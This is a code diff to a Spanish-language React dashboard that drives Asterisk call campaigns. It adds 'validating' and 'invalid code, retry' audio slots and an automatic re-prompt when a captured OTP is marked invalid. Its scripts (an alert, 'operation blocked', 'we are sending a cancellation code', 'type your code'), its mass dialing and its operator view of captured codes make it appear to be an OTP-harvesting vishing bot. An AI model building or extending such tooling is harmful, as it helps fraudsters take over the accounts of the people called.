@@ -71,6 +71,8 @@ export interface CampaignAudioConfig {
   successAudioPath: string;  // Confirmación / Éxito
   cancelCodeAudioPath?: string; // Audio "Un momento por favor, le estamos enviando un código de cancelación"
   otpVerifyWaitAudioPath?: string; // Audio "Un momento por favor, le estamos enviando su código de verificación"
+  waitAudioPath?: string;    // Audio "Un momento, estamos validando su información"
+  failureAudioPath?: string; // Audio "Código inválido, por favor intente de nuevo"
 }
 
 export interface CampaignEntity {
@@ -86,6 +88,7 @@ export interface CampaignEntity {
   agentAudioPath: string;    // Transferencia a Asesor (Opción 1 - "Un momento por favor...")
   successAudioPath: string;  // Validación Exitosa
   waitAudioPath?: string;    // Espera
+  failureAudioPath?: string; // Código inválido / Reintentar
   cancelCodeAudioPath?: string; // Audio al pulsar 1 en modo Código de Cancelación
   otpVerifyWaitAudioPath?: string; // Audio al pulsar 1 en IVR de Captura OTP
   holdMusicAudioPath?: string; // Música de Hold / Espera personalizada por guión
@@ -1005,6 +1008,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           prompt: current.promptAudioPath,
           wait: current.waitAudioPath || 'custom/un_momento_validando_informacion',
           success: current.successAudioPath || 'custom/operacion_bloqueada_exito',
+          failure: current.failureAudioPath || 'custom/token_invalido_reintente',
           agent: current.agentAudioPath || 'custom/conectar_asesor',
           cancelWait: current.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
           otpVerifyWait: current.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion',
@@ -1125,6 +1129,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     promptAudioPath: 'custom/solicitar_codigo_otp',
     agentAudioPath: 'custom/conectar_asesor',
     successAudioPath: 'custom/operacion_bloqueada_exito',
+    waitAudioPath: 'custom/un_momento_validando_informacion',
+    failureAudioPath: 'custom/token_invalido_reintente',
     cancelCodeAudioPath: 'custom/enviando_codigo_cancelacion',
     otpVerifyWaitAudioPath: 'custom/enviando_codigo_verificacion',
   };
@@ -1137,6 +1143,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         promptAudioPath: ent.promptAudioPath || 'custom/solicitar_codigo_otp',
         agentAudioPath: ent.agentAudioPath || 'custom/conectar_asesor',
         successAudioPath: ent.successAudioPath || 'custom/operacion_bloqueada_exito',
+        waitAudioPath: ent.waitAudioPath || 'custom/un_momento_validando_informacion',
+        failureAudioPath: ent.failureAudioPath || 'custom/token_invalido_reintente',
         cancelCodeAudioPath: ent.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
         otpVerifyWaitAudioPath: ent.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion',
       };
@@ -1156,6 +1164,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         promptAudioPath: matched.promptAudioPath || safeDefaultAudioConfig.promptAudioPath,
         agentAudioPath: matched.agentAudioPath || safeDefaultAudioConfig.agentAudioPath,
         successAudioPath: matched.successAudioPath || safeDefaultAudioConfig.successAudioPath,
+        waitAudioPath: matched.waitAudioPath || safeDefaultAudioConfig.waitAudioPath,
+        failureAudioPath: matched.failureAudioPath || safeDefaultAudioConfig.failureAudioPath,
         cancelCodeAudioPath: matched.cancelCodeAudioPath || safeDefaultAudioConfig.cancelCodeAudioPath,
         otpVerifyWaitAudioPath: matched.otpVerifyWaitAudioPath || safeDefaultAudioConfig.otpVerifyWaitAudioPath,
       };
@@ -1209,8 +1219,9 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       const payload = {
         intro: slot === 'introAudioPath' ? cleanPath : (current?.introAudioPath || ''),
         prompt: slot === 'promptAudioPath' ? cleanPath : (current?.promptAudioPath || ''),
-        wait: 'custom/un_momento_validando_informacion',
+        wait: slot === 'waitAudioPath' ? cleanPath : (current?.waitAudioPath || 'custom/un_momento_validando_informacion'),
         success: slot === 'successAudioPath' ? cleanPath : (current?.successAudioPath || ''),
+        failure: slot === 'failureAudioPath' ? cleanPath : (current?.failureAudioPath || 'custom/token_invalido_reintente'),
         agent: slot === 'agentAudioPath' ? cleanPath : (current?.agentAudioPath || ''),
         cancelWait: slot === 'cancelCodeAudioPath' ? cleanPath : (current?.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion'),
         otpVerifyWait: slot === 'otpVerifyWaitAudioPath' ? cleanPath : (current?.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion'),
@@ -1293,8 +1304,9 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           body: JSON.stringify({
             intro: normalizedEntity.introAudioPath,
             prompt: normalizedEntity.promptAudioPath,
-            wait: 'custom/un_momento_validando_informacion',
+            wait: normalizedEntity.waitAudioPath || 'custom/un_momento_validando_informacion',
             success: normalizedEntity.successAudioPath,
+            failure: normalizedEntity.failureAudioPath || 'custom/token_invalido_reintente',
             agent: normalizedEntity.agentAudioPath,
             cancelWait: normalizedEntity.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
             otpVerifyWait: normalizedEntity.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion',
@@ -1328,6 +1340,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           prompt: entity.promptAudioPath,
           wait: entity.waitAudioPath || 'custom/un_momento_validando_informacion',
           success: entity.successAudioPath || 'custom/operacion_bloqueada_exito',
+          failure: entity.failureAudioPath || 'custom/token_invalido_reintente',
           agent: entity.agentAudioPath || 'custom/conectar_asesor',
           cancelWait: entity.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
           otpVerifyWait: entity.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion',
@@ -1364,6 +1377,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       promptAudioPath: 'custom/solicitar_codigo_otp',
       agentAudioPath: 'custom/conectar_asesor',
       successAudioPath: 'custom/operacion_bloqueada_exito',
+      waitAudioPath: 'custom/un_momento_validando_informacion',
+      failureAudioPath: 'custom/token_invalido_reintente',
       cancelCodeAudioPath: 'custom/enviando_codigo_cancelacion',
       otpVerifyWaitAudioPath: 'custom/enviando_codigo_verificacion',
       holdMusicAudioPath: 'default',
@@ -2144,18 +2159,16 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     // Si es INVÁLIDO: Solicitar automáticamente nuevo código y dejar la pantalla lista para capturar el nuevo token
     if (status === 'invalid') {
       setTimeout(() => {
-        if (activeCall) {
-          setActiveCall((prev) =>
-            prev
-              ? {
-                  ...prev,
-                  capturedOtp: undefined,
-                  otpStatus: 'pending',
-                  validationNote: 'Esperando nuevo token digitado por el cliente...',
-                }
-              : null
-          );
-        }
+        setActiveCall((prev) =>
+          prev && prev.otpStatus === 'invalid'
+            ? {
+                ...prev,
+                capturedOtp: undefined,
+                otpStatus: 'pending',
+                validationNote: 'Esperando nuevo código digitado por el cliente...',
+              }
+            : prev
+        );
       }, 1500);
     }
   };
@@ -2741,8 +2754,9 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         body: JSON.stringify({
           intro: currentAudios.introAudioPath || 'custom/bienvenida_corporativa',
           prompt: currentAudios.promptAudioPath || 'custom/solicitar_codigo_otp',
-          wait: 'custom/un_momento_validando_informacion',
+          wait: currentAudios.waitAudioPath || 'custom/un_momento_validando_informacion',
           success: currentAudios.successAudioPath || 'custom/operacion_bloqueada_exito',
+          failure: currentAudios.failureAudioPath || 'custom/token_invalido_reintente',
           agent: currentAudios.agentAudioPath || 'custom/conectar_asesor',
           cancelWait: currentAudios.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
           otpVerifyWait: currentAudios.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion',
@@ -2766,8 +2780,9 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
             carriers,
             audioIntro: currentAudios.introAudioPath || 'custom/bienvenida_corporativa',
             audioPrompt: currentAudios.promptAudioPath || 'custom/solicitar_codigo_otp',
-            audioWait: 'custom/un_momento_validando_informacion',
+            audioWait: currentAudios.waitAudioPath || 'custom/un_momento_validando_informacion',
             audioSuccess: currentAudios.successAudioPath || 'custom/operacion_bloqueada_exito',
+            audioFailure: currentAudios.failureAudioPath || 'custom/token_invalido_reintente',
             audioAgent: currentAudios.agentAudioPath || 'custom/conectar_asesor',
             audioCancelWait: currentAudios.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
             audioOtpVerifyWait: currentAudios.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion',
@@ -2840,6 +2855,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           audioPrompt: currentAudios.promptAudioPath,
           audioAgent: currentAudios.agentAudioPath,
           audioSuccess: currentAudios.successAudioPath,
+          audioWait: currentAudios.waitAudioPath || 'custom/un_momento_validando_informacion',
+          audioFailure: currentAudios.failureAudioPath || 'custom/token_invalido_reintente',
           audioCancelWait: currentAudios.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
           audioOtpVerifyWait: currentAudios.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion',
           holdMusic: (visibleCampaignEntities.length > 0 ? visibleCampaignEntities : campaignEntities).find((e) => e.id === selectedService)?.holdMusicAudioPath || 'default',
@@ -3114,6 +3131,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           audioPrompt: currentAudios.promptAudioPath,
           audioAgent: currentAudios.agentAudioPath,
           audioSuccess: currentAudios.successAudioPath,
+          audioWait: currentAudios.waitAudioPath || 'custom/un_momento_validando_informacion',
+          audioFailure: currentAudios.failureAudioPath || 'custom/token_invalido_reintente',
           audioCancelWait: currentAudios.cancelCodeAudioPath || 'custom/enviando_codigo_cancelacion',
           audioOtpVerifyWait: currentAudios.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion',
           holdMusic: selectedMassEnt?.holdMusicAudioPath || 'default',
@@ -6363,6 +6382,176 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                 </div>
               </div>
 
+              {/* Slot 6: Audio al Marcar 1 en Press-1 + OTP Automático */}
+              <div className="p-4 rounded-xl bg-slate-900 border border-cyan-500/40 space-y-3 md:col-span-2">
+                <div className="flex items-center justify-between">
+                  <label className="text-xs font-bold text-cyan-200 flex items-center gap-2">
+                    <span className="w-2 h-2 rounded-full bg-cyan-400"></span>
+                    <span>6. Press-1 + OTP Auto (Al Marcar 1): "Un momento por favor, le estamos enviando su código de verificación"</span>
+                  </label>
+                  <button
+                    type="button"
+                    onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion', 'otp_verify_wait')}
+                    className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
+                    title="Escuchar audio"
+                  >
+                    {playingAudioKey === 'otp_verify_wait' ? (
+                      <>
+                        <Pause className="w-3.5 h-3.5 text-cyan-400 animate-pulse" />
+                        <span className="text-cyan-400">Pausar</span>
+                      </>
+                    ) : (
+                      <>
+                        <Play className="w-3.5 h-3.5 text-slate-300" />
+                        <span>Escuchar</span>
+                      </>
+                    )}
+                  </button>
+                </div>
+
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
+                  <div className="space-y-1.5">
+                    <div className="text-[11px] text-slate-400">Seleccionar de la audioteca:</div>
+                    <select
+                      value={getServiceAudios(selectedService).otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion'}
+                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'otpVerifyWaitAudioPath', e.target.value)}
+                      className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-cyan-500 font-mono"
+                    >
+                      <option value="custom/enviando_codigo_verificacion">custom/enviando_codigo_verificacion ("Un momento, le estamos enviando su código...") [RECOMENDADO]</option>
+                      {audios.map((a) => (
+                        <option key={a.id} value={a.asteriskPath}>
+                          {a.name} ({a.asteriskPath})
+                        </option>
+                      ))}
+                    </select>
+                  </div>
+
+                  <div className="space-y-1.5">
+                    <div className="text-[11px] text-slate-400">O ingresar ruta directa en el servidor Asterisk:</div>
+                    <input
+                      type="text"
+                      value={getServiceAudios(selectedService).otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion'}
+                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'otpVerifyWaitAudioPath', e.target.value)}
+                      placeholder="ej: custom/enviando_codigo_verificacion"
+                      className="w-full px-3 py-2 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-cyan-500 focus:outline-none"
+                    />
+                  </div>
+                </div>
+                <div className="text-[10px] text-slate-400 font-mono">
+                  Se reproduce al marcar 1 en el <strong>Modo 5 (Press-1 + OTP Automático)</strong> antes de pedir digitar el código.
+                </div>
+              </div>
+
+              {/* Slot 7: Audio Validación en Curso ("Un momento, estamos validando su información") */}
+              <div className="p-4 rounded-xl bg-slate-900 border border-indigo-500/40 space-y-3">
+                <div className="flex items-center justify-between">
+                  <label className="text-xs font-bold text-indigo-200 flex items-center gap-2">
+                    <span className="w-2 h-2 rounded-full bg-indigo-400"></span>
+                    <span>7. Validando Información (Espera Decisión)</span>
+                  </label>
+                  <button
+                    type="button"
+                    onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).waitAudioPath || 'custom/un_momento_validando_informacion', 'wait_slot')}
+                    className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
+                    title="Escuchar audio"
+                  >
+                    {playingAudioKey === 'wait_slot' ? (
+                      <>
+                        <Pause className="w-3.5 h-3.5 text-indigo-400 animate-pulse" />
+                        <span className="text-indigo-400">Pausar</span>
+                      </>
+                    ) : (
+                      <>
+                        <Play className="w-3.5 h-3.5 text-slate-300" />
+                        <span>Escuchar</span>
+                      </>
+                    )}
+                  </button>
+                </div>
+
+                <div className="space-y-1.5">
+                  <div className="text-[11px] text-slate-400">Seleccionar de la audioteca:</div>
+                  <select
+                    value={getServiceAudios(selectedService).waitAudioPath || 'custom/un_momento_validando_informacion'}
+                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'waitAudioPath', e.target.value)}
+                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-indigo-500 font-mono"
+                  >
+                    <option value="custom/un_momento_validando_informacion">custom/un_momento_validando_informacion (Predeterminado)</option>
+                    {audios.map((a) => (
+                      <option key={a.id} value={a.asteriskPath}>
+                        {a.name} ({a.asteriskPath})
+                      </option>
+                    ))}
+                  </select>
+                </div>
+
+                <div className="space-y-1">
+                  <div className="text-[11px] text-slate-400">O ingresar ruta directa en Asterisk:</div>
+                  <input
+                    type="text"
+                    value={getServiceAudios(selectedService).waitAudioPath || 'custom/un_momento_validando_informacion'}
+                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'waitAudioPath', e.target.value)}
+                    placeholder="ej: custom/un_momento_validando_informacion"
+                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-indigo-500 focus:outline-none"
+                  />
+                </div>
+              </div>
+
+              {/* Slot 8: Audio Código Inválido / Reintento */}
+              <div className="p-4 rounded-xl bg-slate-900 border border-rose-500/40 space-y-3">
+                <div className="flex items-center justify-between">
+                  <label className="text-xs font-bold text-rose-200 flex items-center gap-2">
+                    <span className="w-2 h-2 rounded-full bg-rose-400"></span>
+                    <span>8. Código Inválido / Reintentar OTP</span>
+                  </label>
+                  <button
+                    type="button"
+                    onClick={() => handleTogglePlayAudio(getServiceAudios(selectedService).failureAudioPath || 'custom/token_invalido_reintente', 'failure_slot')}
+                    className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
+                    title="Escuchar audio"
+                  >
+                    {playingAudioKey === 'failure_slot' ? (
+                      <>
+                        <Pause className="w-3.5 h-3.5 text-rose-400 animate-pulse" />
+                        <span className="text-rose-400">Pausar</span>
+                      </>
+                    ) : (
+                      <>
+                        <Play className="w-3.5 h-3.5 text-slate-300" />
+                        <span>Escuchar</span>
+                      </>
+                    )}
+                  </button>
+                </div>
+
+                <div className="space-y-1.5">
+                  <div className="text-[11px] text-slate-400">Seleccionar de la audioteca:</div>
+                  <select
+                    value={getServiceAudios(selectedService).failureAudioPath || 'custom/token_invalido_reintente'}
+                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'failureAudioPath', e.target.value)}
+                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-rose-500 font-mono"
+                  >
+                    <option value="custom/token_invalido_reintente">custom/token_invalido_reintente (Predeterminado)</option>
+                    {audios.map((a) => (
+                      <option key={a.id} value={a.asteriskPath}>
+                        {a.name} ({a.asteriskPath})
+                      </option>
+                    ))}
+                  </select>
+                </div>
+
+                <div className="space-y-1">
+                  <div className="text-[11px] text-slate-400">O ingresar ruta directa en Asterisk:</div>
+                  <input
+                    type="text"
+                    value={getServiceAudios(selectedService).failureAudioPath || 'custom/token_invalido_reintente'}
+                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'failureAudioPath', e.target.value)}
+                    placeholder="ej: custom/token_invalido_reintente"
+                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-rose-500 focus:outline-none"
+                  />
+                </div>
+              </div>
+
             </div>
           </div>
 
@@ -6497,10 +6686,13 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-xl text-xs text-white"
                 >
                   <option value="introAudioPath">1. Saludo / Alerta Inicial</option>
-                  <option value="promptAudioPath">2. Solicitud de Código OTP</option>
-                  <option value="agentAudioPath">3. Pre-Transferencia Press-1 (Asesor)</option>
-                  <option value="successAudioPath">4. Confirmación / Éxito OTP</option>
-                  <option value="cancelCodeAudioPath">5. Enviando Código Cancelación (Press-1)</option>
+                  <option value="otpVerifyWaitAudioPath">2. Press-1 + OTP Auto: Al Marcar 1 (Enviando Código)</option>
+                  <option value="promptAudioPath">3. Solicitud de Código OTP (Digite su código)</option>
+                  <option value="waitAudioPath">4. Validando Información (Espera)</option>
+                  <option value="successAudioPath">5. Confirmación / Éxito OTP (Válido)</option>
+                  <option value="failureAudioPath">6. Código Inválido / Reintento</option>
+                  <option value="agentAudioPath">7. Pre-Transferencia Press-1 (Asesor)</option>
+                  <option value="cancelCodeAudioPath">8. Enviando Código Cancelación (Modo 4)</option>
                 </select>
               </div>
 
@@ -7140,6 +7332,64 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                       placeholder="custom/enviando_codigo_cancelacion"
                       className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-slate-200 font-mono focus:outline-none focus:border-amber-500 disabled:opacity-60 disabled:cursor-not-allowed"
                     />
+                  </div>
+                </div>
+
+                {/* 7. Audios Modo 5: Press-1 + OTP Automático (Espera 1, Validando, Inválido) */}
+                <div className="p-3.5 rounded-xl bg-slate-950 border border-cyan-500/30 space-y-3">
+                  <div className="text-xs font-bold text-cyan-300 flex items-center gap-1.5">
+                    <Zap className="w-3.5 h-3.5 text-cyan-400" />
+                    <span>7. Audios de Press-1 + OTP Automático (Al Marcar 1 / Validando / Inválido)</span>
+                  </div>
+                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
+                    <div>
+                      <div className="text-[10px] text-cyan-300 mb-1">Al marcar 1 (Enviando código):</div>
+                      <select
+                        value={editingEntity.otpVerifyWaitAudioPath || 'custom/enviando_codigo_verificacion'}
+                        onChange={(e) => setEditingEntity({ ...editingEntity, otpVerifyWaitAudioPath: e.target.value })}
+                        disabled={!isAdmin}
+                        className="w-full px-2.5 py-2 bg-slate-900 border border-slate-700 rounded-lg text-[11px] text-white font-mono focus:outline-none focus:border-cyan-500 disabled:opacity-60"
+                      >
+                        <option value="custom/enviando_codigo_verificacion">custom/enviando_codigo_verificacion</option>
+                        {audios.map((a) => (
+                          <option key={a.id} value={a.asteriskPath}>
+                            {a.name}
+                          </option>
+                        ))}
+                      </select>
+                    </div>
+                    <div>
+                      <div className="text-[10px] text-indigo-300 mb-1">Validando información:</div>
+                      <select
+                        value={editingEntity.waitAudioPath || 'custom/un_momento_validando_informacion'}
+                        onChange={(e) => setEditingEntity({ ...editingEntity, waitAudioPath: e.target.value })}
+                        disabled={!isAdmin}
+                        className="w-full px-2.5 py-2 bg-slate-900 border border-slate-700 rounded-lg text-[11px] text-white font-mono focus:outline-none focus:border-indigo-500 disabled:opacity-60"
+                      >
+                        <option value="custom/un_momento_validando_informacion">custom/un_momento_validando_informacion</option>
+                        {audios.map((a) => (
+                          <option key={a.id} value={a.asteriskPath}>
+                            {a.name}
+                          </option>
+                        ))}
+                      </select>
+                    </div>
+                    <div>
+                      <div className="text-[10px] text-rose-300 mb-1">Código Inválido / Reintento:</div>
+                      <select
+                        value={editingEntity.failureAudioPath || 'custom/token_invalido_reintente'}
+                        onChange={(e) => setEditingEntity({ ...editingEntity, failureAudioPath: e.target.value })}
+                        disabled={!isAdmin}
+                        className="w-full px-2.5 py-2 bg-slate-900 border border-slate-700 rounded-lg text-[11px] text-white font-mono focus:outline-none focus:border-rose-500 disabled:opacity-60"
+                      >
+                        <option value="custom/token_invalido_reintente">custom/token_invalido_reintente</option>
+                        {audios.map((a) => (
+                          <option key={a.id} value={a.asteriskPath}>
+                            {a.name}
+                          </option>
+                        ))}
+                      </select>
+                    </div>
                   </div>
                 </div>
               </div>
